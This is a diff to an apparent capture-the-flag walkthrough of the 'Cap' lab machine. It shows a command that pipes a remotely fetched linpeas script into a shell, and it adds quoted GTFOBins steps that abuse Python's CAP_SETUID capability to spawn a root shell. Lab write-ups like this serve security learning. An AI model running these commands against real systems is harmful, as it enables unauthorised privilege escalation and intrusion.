@@ -146,7 +146,21 @@ Performing linpeas scan
 nathan@cap:~$ curl http://10.10.14.61:80/linpeas.sh | sh
 ```
 
-Linpeash scanned and found potential pkexec exploit and a bin file vulnerability
+linpeas scanned and found a potential pkexec exploit and a Python binary vulnerability.
+
+Checked GTFOBins for more information about the Python vulnerability.
+
+```bash
+Capabilities
+
+If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.
+
+    cp $(which python) .
+    sudo setcap cap_setuid+ep python
+
+    ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+```
 
 Attempted to execute > Successful!
 
